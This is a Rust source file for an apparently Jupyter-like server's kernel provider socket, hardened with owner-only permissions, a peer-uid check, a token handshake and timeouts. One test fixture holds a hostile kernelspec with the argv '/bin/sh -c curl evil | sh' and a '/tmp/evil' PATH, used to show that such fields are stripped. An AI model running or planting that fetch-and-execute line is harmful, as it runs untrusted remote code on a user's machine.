//! The kernel provider socket (#983): a program of the same user, such as
//! the Ganymede app's background engine, registers kernelspecs with a
//! running `ganymede serve` and runs their kernels itself.
//!
//! The design is `docs/kernel-provider.md`; the frames are in
//! `docs/embedding.md` and the boundary in `docs/security.md`. A
//! connection is an [`AppKernel`] behind the server's
//! [`RegisteredKernels`], so its kernels run through the same sessions,
//! rooms, execute endpoint and kernel list as any other.
//!
//! The socket lives in the Jupyter runtime dir, `ganymede-kernels-<pid>.sock`,
//! and is named in `jpserver-<pid>.json` as `kernel_providers_socket`. It
//! is made `0600` in a private temp dir and renamed into place, so it is
//! never visible with a wider mode; the runtime dir itself must already
//! be owner-only. A connection must come from this user (checked with the
//! peer's uid) and say `hello` with the server's token within
//! [`Timing::hello`]. While it holds the connection it may register
//! display-only kernelspecs (no `argv`, no `env`) and answer `start`,
//! `send` and `stop` for the kernels it started. When it closes, its
//! kernels end as lost and are never restarted.

use crate::auth::constant_time_eq;
use anyhow::Context;
use ganymede_kernel_host::{
    AppKernel, Ended, InterruptMode, Kernelspec, LaunchOptions, RegisteredKernels,
};
use ganymede_protocol::{Channel, Message};
use serde::Deserialize;
use serde_json::{json, Map, Value};
use std::collections::{BTreeMap, HashMap, HashSet};
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, ReadHalf, WriteHalf};
use tokio::net::UnixStream;
use tokio::sync::{mpsc, oneshot, watch};

/// The longest line a provider may send: a Jupyter message with buffers
/// can be large. A longer one closes the connection.
const MAX_LINE: usize = 64 * 1024 * 1024;

/// Frames waiting for the writer before the connection is closed rather
/// than drop one. The events socket's rule (#978), one queue per
/// connection.
const QUEUE: usize = 1024;

/// How a connection's handshake and writes are timed. The defaults are
/// what a provider gets; a test overrides them, since it can't wait
/// seconds, through [`crate::serve::Startup::kernel_provider_timing`].
#[derive(Debug, Clone, Copy)]
pub struct Timing {
    /// How long a new connection has to send `hello`.
    pub hello: Duration,
    /// How long one write to a provider may take before the connection is
    /// closed: a provider that takes nothing is not reading.
    pub write_stall: Duration,
}

impl Default for Timing {
    fn default() -> Self {
        Timing {
            hello: Duration::from_secs(10),
            write_stall: Duration::from_secs(10),
        }
    }
}

/// The open socket; dropping it removes the file and closes every
/// connection, whose kernels are then lost. Held for the server's
/// lifetime by `serve.rs`.
pub struct Listener {
    path: PathBuf,
    /// Set on drop; the accept loop and every connection watch it.
    shutdown: watch::Sender<bool>,
    accept: tokio::task::JoinHandle<()>,
}

impl Listener {
    /// The socket file's absolute path, which the info file names.
    pub fn path(&self) -> &Path {
        &self.path
    }
}

impl Drop for Listener {
    fn drop(&mut self) {
        let _ = self.shutdown.send(true);
        self.accept.abort();
        match std::fs::remove_file(&self.path) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => tracing::warn!("cannot remove {}: {e}", self.path.display()),
        }
    }
}

/// Opens the kernel provider socket, or says why not. `None` means it
/// stays closed: `[kernel_providers] enabled` is off, the server is
/// embedded, auth is off, or the runtime dir, path or bind wouldn't give
/// a socket only this user can reach. Every case but "off" logs one
/// warning.
pub fn start(
    enabled: bool,
    embedded: bool,
    token: Option<&str>,
    timing: Timing,
    registered: Arc<RegisteredKernels>,
) -> Option<Listener> {
    if !enabled {
        return None;
    }
    if embedded {
        tracing::warn!(
            "kernel providers: an embedded server opens no provider socket; \
             [kernel_providers] enabled has no effect"
        );
        return None;
    }
    let Some(token) = token.map(str::to_owned) else {
        tracing::warn!(
            "kernel providers: auth is off, so anyone who can write the socket could register \
             a kernel; [kernel_providers] enabled needs a token"
        );
        return None;
    };
    match listen(&registered, &token, timing) {
        Ok(listener) => Some(listener),
        Err(e) => {
            tracing::warn!("kernel providers: the socket stays closed: {e:#}");
            None
        }
    }
}

/// Binds the socket and starts accepting. Any failure leaves no file
/// behind: the temp dir the socket was made in goes with it.
fn listen(
    registered: &Arc<RegisteredKernels>,
    token: &str,
    timing: Timing,
) -> anyhow::Result<Listener> {
    let dir = ganymede_kernel_host::kernelspec::jupyter_runtime_dir();
    crate::server_info::create_private_dir(&dir)
        .with_context(|| format!("cannot create {}", dir.display()))?;
    check_private_dir(&dir)?;
    let path = dir.join(format!("ganymede-kernels-{}.sock", std::process::id()));
    let len = path.as_os_str().as_encoded_bytes().len();
    let max = max_socket_path_len();
    if len > max {
        anyhow::bail!(
            "{} is {len} bytes, over the platform's {max}-byte socket path limit",
            path.display()
        );
    }

    // Made in a private temp dir and renamed into place, so the socket is
    // never visible with the mode `bind` gives it (0077 less the umask).
    let staging = tempfile::Builder::new()
        .prefix(".ganymede-kernels-")
        .tempdir_in(&dir)
        .context("cannot make a temp dir for the socket")?;
    let staged = staging.path().join("socket");
    let listener = std::os::unix::net::UnixListener::bind(&staged)
        .with_context(|| format!("cannot bind {}", staged.display()))?;
    std::fs::set_permissions(&staged, std::fs::Permissions::from_mode(0o600))
        .with_context(|| format!("cannot make {} owner-only", staged.display()))?;
    // A file left by an earlier process with this pid: gone, not bound
    // over.
    match std::fs::remove_file(&path) {
        Ok(()) => tracing::debug!("removed the stale socket {}", path.display()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => return Err(e).with_context(|| format!("cannot remove {}", path.display())),
    }
    listener
        .set_nonblocking(true)
        .context("cannot make the socket non-blocking")?;
    std::fs::rename(&staged, &path)
        .with_context(|| format!("cannot move the socket to {}", path.display()))?;
    let _ = staging.close();
    let listener = tokio::net::UnixListener::from_std(listener)?;
    tracing::info!("kernel providers: listening on {}", path.display());

    let (shutdown, stop) = watch::channel(false);
    let accept = tokio::spawn(accept_loop(
        listener,
        registered.clone(),
        token.into(),
        timing,
        stop,
    ));
    Ok(Listener {
        path,
        shutdown,
        accept,
    })
}

/// Accepts connections until the server stops. A connection from another
/// user is closed without a frame, as is one that fails its handshake.
async fn accept_loop(
    listener: tokio::net::UnixListener,
    registered: Arc<RegisteredKernels>,
    token: Arc<str>,
    timing: Timing,
    mut stop: watch::Receiver<bool>,
) {
    let own_uid = own_uid();
    loop {
        let (stream, _) = tokio::select! {
            _ = stop.changed() => break,
            accepted = listener.accept() => match accepted {
                Ok(accepted) => accepted,
                Err(e) => {
                    tracing::debug!("accept on the kernel provider socket: {e}");
                    tokio::time::sleep(Duration::from_millis(100)).await;
                    continue;
                }
            },
        };
        let registered = registered.clone();
        let token = token.clone();
        let stop = stop.clone();
        tokio::spawn(async move {
            run_connection(stream, registered, token, own_uid, timing, stop).await;
        });
    }
}

/// Whether a peer's uid is this user's. Pure, so a test can cover the
/// refusal that CI can't arrange.
fn peer_allowed(peer_uid: u32, own_uid: u32) -> bool {
    peer_uid == own_uid
}

/// This process's effective uid, which a connection's peer uid must
/// match.
fn own_uid() -> u32 {
    // SAFETY: `geteuid` takes no arguments and cannot fail on any Unix.
    unsafe { libc::geteuid() }
}

/// The longest path a Unix socket may have here: `sockaddr_un.sun_path`
/// less the terminating NUL (104 bytes on macOS, 108 on Linux).
fn max_socket_path_len() -> usize {
    // SAFETY: `sockaddr_un` is plain data of integer arrays and scalars;
    // all-zero is a valid, if unbound, value, and only its layout is read.
    let addr: libc::sockaddr_un = unsafe { std::mem::zeroed() };
    addr.sun_path.len() - 1
}

/// Whether `dir` is one only this user can write: no group or other write
/// bit (so no one else can plant a socket or a file there), and owned by
/// this user. Anything else and the socket isn't opened: the file mode of
/// the socket would mean nothing in a dir another user can write.
fn check_private_dir(dir: &Path) -> anyhow::Result<()> {
    use std::os::unix::fs::MetadataExt;
    let meta = dir
        .metadata()
        .with_context(|| format!("cannot read {}", dir.display()))?;
    let mode = meta.mode() & 0o777;
    if mode & 0o022 != 0 {
        anyhow::bail!(
            "{} is {mode:03o}: group- or world-writable, so its socket would not be private",
            dir.display()
        );
    }
    let own = own_uid();
    if meta.uid() != own {
        anyhow::bail!(
            "{} is owned by uid {}, not this server's {own}",
            dir.display(),
            meta.uid()
        );
    }
    Ok(())
}

/// One provider connection: the handshake, then frames both ways until
/// either side closes.
async fn run_connection(
    stream: UnixStream,
    registered: Arc<RegisteredKernels>,
    token: Arc<str>,
    own_uid: u32,
    timing: Timing,
    mut stop: watch::Receiver<bool>,
) {
    match stream.peer_cred() {
        Ok(cred) if peer_allowed(cred.uid(), own_uid) => {}
        Ok(cred) => {
            tracing::debug!(
                "closing a kernel provider connection from uid {}: not this server's user",
                cred.uid()
            );
            return;
        }
        Err(e) => {
            tracing::debug!("cannot read a kernel provider's credentials: {e}");
            return;
        }
    }
    let (read_half, mut write_half) = tokio::io::split(stream);
    let mut reader = BufReader::new(read_half);

    // The handshake is written directly, not through the queue below: the
    // welcome must reach the provider before the connection closes.
    let hello = tokio::select! {
        _ = stop.changed() => return,
        hello = tokio::time::timeout(timing.hello, read_frame(&mut reader)) => hello,
    };
    let why = match hello {
        Err(_) => Some(format!("no hello within {}s", timing.hello.as_secs_f32())),
        Ok(Err(e)) => Some(format!("cannot read its hello: {e}")),
        Ok(Ok(None)) => Some("the connection closed before hello".to_string()),
        Ok(Ok(Some(line))) => match serde_json::from_str::<Incoming>(&line) {
            Ok(frame) if frame.op == "hello" => match frame.token {
                Some(sent) if constant_time_eq(sent.as_bytes(), token.as_bytes()) => None,
                Some(_) => Some("the token is not this server's".to_string()),
                None => Some("hello has no token".to_string()),
            },
            Ok(frame) => Some(format!("the first frame is {:?}, not hello", frame.op)),
            Err(e) => Some(format!("the first frame is not JSON: {e}")),
        },
    };
    if let Some(why) = why {
        tracing::debug!("refusing a kernel provider: {why}");
        let frame = json!({"op": "welcome", "error": why});
        let _ = write_line(&mut write_half, &frame.to_string(), timing.write_stall).await;
        return;
    }
    if write_line(
        &mut write_half,
        &json!({"op": "welcome"}).to_string(),
        timing.write_stall,
    )
    .await
    .is_err()
    {
        return;
    }

    let (out, out_rx) = mpsc::channel::<String>(QUEUE);
    let (closed, closed_rx) = watch::channel(false);
    let kernel = Arc::new(ProviderKernel {
        out,
        closed: closed.clone(),
        state: Mutex::new(Default::default()),
    });
    let app: Arc<dyn AppKernel> = kernel.clone();
    let mut writer = tokio::spawn(write_frames(
        write_half,
        out_rx,
        closed_rx.clone(),
        closed.clone(),
        timing.write_stall,
    ));
    let mut closed_rx = closed_rx;

    loop {
        let line = tokio::select! {
            _ = stop.changed() => break,
            _ = closed_rx.changed() => break,
            read = read_frame(&mut reader) => match read {
                Ok(Some(line)) => line,
                Ok(None) => break,
                Err(e) => {
                    tracing::debug!("reading from a kernel provider: {e}");
                    break;
                }
            },
        };
        let frame: Incoming = match serde_json::from_str(&line) {
            Ok(frame) => frame,
            Err(e) => {
                tracing::debug!("undecodable kernel provider frame: {e}");
                break;
            }
        };
        if !kernel.handle(frame, &registered, &app) {
            break;
        }
    }

    kernel.close();
    // Nothing this connection registered or started outlives it.
    let ended = registered.end_all_from(&app, Ended::Gone);
    let failed = kernel.state.lock().unwrap().pending.drain().count();
    if ended > 0 || failed > 0 {
        tracing::info!(
            "a kernel provider disconnected: {ended} kernel(s) ended as lost, \
             {failed} start(s) unanswered"
        );
    }
    if tokio::time::timeout(Duration::from_secs(1), &mut writer)
        .await
        .is_err()
    {
        writer.abort();
    }
}

/// One newline-delimited JSON line, or `None` at EOF. A line over
/// [`MAX_LINE`] is an error, and the connection closes.
async fn read_frame(
    reader: &mut BufReader<ReadHalf<UnixStream>>,
) -> std::io::Result<Option<String>> {
    let mut line: Vec<u8> = Vec::new();
    loop {
        let available = reader.fill_buf().await?;
        if available.is_empty() {
            return Ok((!line.is_empty())
                .then(|| String::from_utf8_lossy(&line).into_owned())
                .filter(|l| !l.trim().is_empty()));
        }
        let end = available.iter().position(|b| *b == b'\n');
        let take = end.unwrap_or(available.len());
        line.extend_from_slice(&available[..take]);
        reader.consume(take + usize::from(end.is_some()));
        if line.len() > MAX_LINE {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!("a frame over {MAX_LINE} bytes"),
            ));
        }
        if end.is_some() {
            return Ok(Some(String::from_utf8_lossy(&line).into_owned()));
        }
    }
}

/// Writes one frame's line, giving up after `stall`.
async fn write_line(
    write: &mut WriteHalf<UnixStream>,
    line: &str,
    stall: Duration,
) -> std::io::Result<()> {
    let mut bytes = line.as_bytes().to_vec();
    bytes.push(b'\n');
    match tokio::time::timeout(stall, write.write_all(&bytes)).await {
        Ok(r) => r,
        Err(_) => Err(std::io::Error::new(
            std::io::ErrorKind::TimedOut,
            "the provider took the frame too slowly",
        )),
    }
}

/// Drains the queue to the provider. A full queue is caught at `try_send`
/// by the server's side; here a write that takes too long, or fails,
/// closes the connection, and with it the provider's kernels.
async fn write_frames(
    mut write: WriteHalf<UnixStream>,
    mut frames: mpsc::Receiver<String>,
    mut closed: watch::Receiver<bool>,
    closing: watch::Sender<bool>,
    stall: Duration,
) {
    loop {
        let line = tokio::select! {
            _ = closed.changed() => break,
            frame = frames.recv() => match frame {
                Some(line) => line,
                None => break,
            },
        };
        match write_line(&mut write, &line, stall).await {
            Ok(()) => {}
            Err(e) => {
                tracing::warn!(
                    "a kernel provider is not taking its frames ({e}); closing its connection"
                );
                break;
            }
        }
    }
    let _ = write.shutdown().await;
    let _ = closing.send(true);
}

/// One connection's `AppKernel`: the frames the server sends it, the
/// starts it awaits, and the kernel ids and names it owns.
struct ProviderKernel {
    /// Frames for the writer. A full or closed queue means the provider
    /// is gone: the connection closes.
    out: mpsc::Sender<String>,
    closed: watch::Sender<bool>,
    state: Mutex<KernelState>,
}

#[derive(Default)]
struct KernelState {
    /// The `started` answer of each start, for [`AppKernel::started`],
    /// which the host calls right after `start` returns.
    acks: HashMap<String, oneshot::Receiver<std::result::Result<(), String>>>,
    /// The other end of each, for the provider's `started` frame.
    pending: HashMap<String, oneshot::Sender<std::result::Result<(), String>>>,
    /// Kernel ids this connection was asked to start, so `deliver` and
    /// `ended` reach only its own.
    started: HashSet<String>,
    /// Kernelspec names it registered, so it can unregister only those.
    names: HashSet<String>,
}

impl ProviderKernel {
    /// Queues a frame, closing the connection when it can't: a full queue
    /// means the provider stopped reading, and no frame is dropped
    /// silently.
    fn enqueue(&self, frame: Value) -> bool {
        match self.out.try_send(frame.to_string()) {
            Ok(()) => true,
            Err(_) => {
                self.close();
                false
            }
        }
    }

    fn close(&self) {
        let _ = self.closed.send(true);
    }

    /// A frame from the provider. False closes the connection.
    fn handle(
        &self,
        frame: Incoming,
        registered: &Arc<RegisteredKernels>,
        app: &Arc<dyn AppKernel>,
    ) -> bool {
        match frame.op.as_str() {
            "register" => {
                let Some(spec) = frame.spec else {
                    tracing::debug!("a register frame has no spec");
                    return false;
                };
                let name = spec.name.to_lowercase();
                // Display fields only: a provider never names a program to
                // run. `argv`, `env` and the rest are dropped here.
                let spec = Kernelspec {
                    name: name.clone(),
                    resource_dir: PathBuf::new(),
                    gateway: false,
                    argv: Vec::new(),
                    display_name: spec.display_name,
                    language: spec.language,
                    interrupt_mode: InterruptMode::Message,
                    env: BTreeMap::new(),
                    metadata: spec.metadata,
                    extra: Map::new(),
                };
                let reply =
                    match registered
                        .register(spec, ganymede_kernel_host::Origin::Provider, || app.clone())
                    {
                        Ok(()) => {
                            self.state.lock().unwrap().names.insert(name.clone());
                            json!({"op": "registered", "name": name})
                        }
                        Err(e) => json!({"op": "registered", "name": name, "error": e.to_string()}),
                    };
                self.enqueue(reply)
            }
            "unregister" => {
                let Some(name) = frame.name.map(|n| n.to_lowercase()) else {
                    tracing::debug!("an unregister frame has no name");
                    return false;
                };
                if self.state.lock().unwrap().names.remove(&name) {
                    registered.unregister(&name);
                } else {
                    tracing::debug!(
                        "a provider tried to unregister {name:?}, which it does not hold"
                    );
                }
                true
            }
            "started" => {
                let Some(id) = frame.kernel_id else {
                    tracing::debug!("a started frame has no kernel_id");
                    return false;
                };
                let answer = match frame.error.filter(|e| !e.is_empty()) {
                    Some(e) => Err(e),
                    None => Ok(()),
                };
                if let Some(tx) = self.state.lock().unwrap().pending.remove(&id) {
                    let _ = tx.send(answer);
                } else {
                    tracing::debug!("a started frame for {id}, which was not starting");
                }
                true
            }
            "deliver" => {
                let Some(id) = frame.kernel_id else {
                    tracing::debug!("a deliver frame has no kernel_id");
                    return false;
                };
                if !self.state.lock().unwrap().started.contains(&id) {
                    tracing::debug!(
                        "a deliver frame for {id}, which this connection did not start"
                    );
                    return true;
                }
                let channel = match frame.channel.as_deref().map(str::parse::<Channel>) {
                    Some(Ok(channel)) => channel,
                    _ => {
                        tracing::debug!("a deliver frame with no channel this server knows");
                        return false;
                    }
                };
                let Some(value) = frame.msg else {
                    tracing::debug!("a deliver frame with no msg");
                    return false;
                };
                let msg = match message_from_json(value) {
                    Ok(msg) => msg,
                    Err(e) => {
                        tracing::debug!("a deliver frame's msg: {e}");
                        return false;
                    }
                };
                if let Err(e) = registered.deliver(&id, channel, msg) {
                    tracing::debug!("delivering from {id}: {e}");
                }
                true
            }
            "ended" => {
                let Some(id) = frame.kernel_id else {
                    tracing::debug!("an ended frame has no kernel_id");
                    return false;
                };
                if !self.state.lock().unwrap().started.remove(&id) {
                    tracing::debug!("an ended frame for {id}, which this connection did not start");
                    return true;
                }
                let why = match frame.reason.as_deref() {
                    Some("exited") => Ended::Exited,
                    Some("lost") => Ended::Lost,
                    _ => {
                        tracing::debug!("an ended frame with no reason this server knows");
                        return false;
                    }
                };
                registered.ended(&id, why);
                true
            }
            // A second hello, or anything unknown: the connection is out of
            // step, and there is no frame for a refusal.
            other => {
                tracing::debug!("unknown kernel provider frame {other:?}");
                false
            }
        }
    }
}

impl AppKernel for ProviderKernel {
    fn start(
        &self,
        kernel_id: &str,
        _spec: &Kernelspec,
        opts: &LaunchOptions,
    ) -> std::result::Result<(), String> {
        let (tx, rx) = oneshot::channel();
        {
            let mut state = self.state.lock().unwrap();
            state.pending.insert(kernel_id.to_string(), tx);
            state.acks.insert(kernel_id.to_string(), rx);
            state.started.insert(kernel_id.to_string());
        }
        let mut env = Map::new();
        if let Some((_, session)) = opts.env.iter().find(|(k, _)| k == "JPY_SESSION_NAME") {
            env.insert("JPY_SESSION_NAME".into(), Value::from(session.as_str()));
        }
        let mut launch = json!({ "env": env });
        if let Some(cwd) = &opts.cwd {
            launch["cwd"] = Value::from(cwd.to_string_lossy().as_ref());
        }
        let frame = json!({"op": "start", "kernel_id": kernel_id, "launch": launch});
        if self.enqueue(frame) {
            Ok(())
        } else {
            Err("the provider's connection closed".into())
        }
    }

    fn started(
        &self,
        kernel_id: &str,
    ) -> Option<oneshot::Receiver<std::result::Result<(), String>>> {
        self.state.lock().unwrap().acks.remove(kernel_id)
    }

    fn send(&self, kernel_id: &str, channel: Channel, msg: &Message) {
        let msg = match message_to_json(msg) {
            Ok(msg) => msg,
            Err(e) => {
                tracing::warn!("a message was not sent to the provider: {e}");
                return;
            }
        };
        let frame = json!({
            "op": "send",
            "kernel_id": kernel_id,
            "channel": channel.as_str(),
            "msg": msg,
        });
        self.enqueue(frame);
    }

    fn stop(&self, kernel_id: &str) {
        self.enqueue(json!({"op": "stop", "kernel_id": kernel_id}));
    }
}

/// A frame from a provider. One object per line; the fields `op`'s table
/// in `docs/embedding.md` names. Fields a frame doesn't use are ignored,
/// and a missing one is caught where it matters.
#[derive(Deserialize)]
struct Incoming {
    op: String,
    #[serde(default)]
    token: Option<String>,
    #[serde(default)]
    name: Option<String>,
    #[serde(default)]
    spec: Option<SpecIn>,
    #[serde(default)]
    kernel_id: Option<String>,
    #[serde(default)]
    channel: Option<String>,
    #[serde(default)]
    msg: Option<Value>,
    #[serde(default)]
    reason: Option<String>,
    #[serde(default)]
    error: Option<String>,
}

/// The fields of a `register`'s `spec` that a provider may set: no
/// `argv`, no `env`, and nothing else.
#[derive(Deserialize)]
struct SpecIn {
    name: String,
    #[serde(default)]
    display_name: String,
    #[serde(default)]
    language: String,
    #[serde(default)]
    metadata: Map<String, Value>,
}

/// `msg` in the websocket's JSON shape, with its buffers as base64
/// strings in `buffers` (the C ABI's shape).
fn message_to_json(msg: &Message) -> anyhow::Result<Value> {
    use base64::Engine;
    let mut v = serde_json::to_value(msg)?;
    v["buffers"] = msg
        .buffers
        .iter()
        .map(|b| base64::engine::general_purpose::STANDARD.encode(b).into())
        .collect::<Vec<Value>>()
        .into();
    Ok(v)
}

/// The other way: base64 strings in `buffers` become the buffers.
fn message_from_json(mut v: Value) -> anyhow::Result<Message> {
    use base64::Engine;
    let buffers = match v.as_object_mut().and_then(|m| m.remove("buffers")) {
        None | Some(Value::Null) => Vec::new(),
        Some(Value::Array(items)) => items
            .iter()
            .map(|b| {
                let text = b
                    .as_str()
                    .ok_or_else(|| anyhow::anyhow!("a buffer is not a base64 string"))?;
                Ok(base64::engine::general_purpose::STANDARD
                    .decode(text)?
                    .into())
            })
            .collect::<anyhow::Result<_>>()?,
        Some(_) => anyhow::bail!("buffers is not a list"),
    };
    if let Some(m) = v.as_object_mut() {
        m.remove("channel");
    }
    let mut msg: Message = serde_json::from_value(v)?;
    msg.buffers = buffers;
    Ok(msg)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Only this user's processes connect: another uid is closed at once.
    /// CI can't arrange a second user, so this covers that rule.
    #[test]
    fn only_this_users_processes_are_let_in() {
        assert!(peer_allowed(501, 501));
        assert!(peer_allowed(0, 0));
        assert!(!peer_allowed(501, 502));
        assert!(!peer_allowed(0, 501));
    }

    /// A runtime dir this user made owner-only is fine; one another user
    /// can write is refused, socket or no socket.
    #[test]
    fn the_runtime_dir_must_be_owner_only() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        assert!(check_private_dir(dir.path()).is_ok());
        for mode in [0o770, 0o777, 0o777 & !0o400] {
            std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(mode)).unwrap();
            let e = check_private_dir(dir.path()).err().unwrap();
            assert!(e.to_string().contains("group- or world-writable"), "{e}");
        }
        // 0700 with the owner's read bit off still can't be another
        // user's, so it is allowed.
        std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(0o300)).unwrap();
        assert!(check_private_dir(dir.path()).is_ok());
    }

    /// The limit comes from the platform's `sun_path`, not a guess:
    /// 103 bytes on macOS (104 less the NUL) and 107 on Linux.
    #[test]
    fn the_socket_path_limit_comes_from_sun_path() {
        let max = max_socket_path_len();
        let expected = if cfg!(target_os = "macos") { 103 } else { 107 };
        if cfg!(any(target_os = "macos", target_os = "linux")) {
            assert_eq!(max, expected);
        }
        assert!((100..=108).contains(&max), "{max}");
    }

    /// A spec keeps only the fields a provider may set: whatever else it
    /// sends, `argv` and `env` included, is dropped.
    #[test]
    fn a_spec_keeps_only_display_fields() {
        let spec: SpecIn = serde_json::from_value(json!({
            "name": "Cdp-Browser",
            "display_name": "Browser",
            "language": "typescript",
            "metadata": {"capabilities": {"device": true}},
            "argv": ["/bin/sh", "-c", "curl evil | sh"],
            "env": {"PATH": "/tmp/evil"},
            "interrupt_mode": "signal",
        }))
        .unwrap();
        let metadata = spec.metadata.clone();
        let stripped = Kernelspec {
            name: spec.name.to_lowercase(),
            resource_dir: PathBuf::new(),
            gateway: false,
            argv: Vec::new(),
            display_name: spec.display_name,
            language: spec.language,
            interrupt_mode: InterruptMode::Message,
            env: BTreeMap::new(),
            metadata: spec.metadata,
            extra: Map::new(),
        };
        assert_eq!(stripped.name, "cdp-browser");
        assert!(stripped.argv.is_empty());
        assert!(stripped.env.is_empty());
        assert!(stripped.extra.is_empty());
        assert_eq!(stripped.interrupt_mode, InterruptMode::Message);
        assert_eq!(stripped.metadata, metadata);
        assert_eq!(stripped.display_name, "Browser");
    }

    /// Messages go out with base64 buffers and come back byte for byte.
    #[test]
    fn messages_round_trip_through_their_json_form() {
        let msg =
            Message::new("execute_result", "s", "me", &json!({"data": {}})).with_buffers(vec![
                b"\x00\x01\x02".as_slice().into(),
                b"two".as_slice().into(),
            ]);
        let value = message_to_json(&msg).unwrap();
        assert_eq!(value["buffers"][0], "AAEC");
        let back = message_from_json(value).unwrap();
        assert_eq!(back, msg);
    }
}
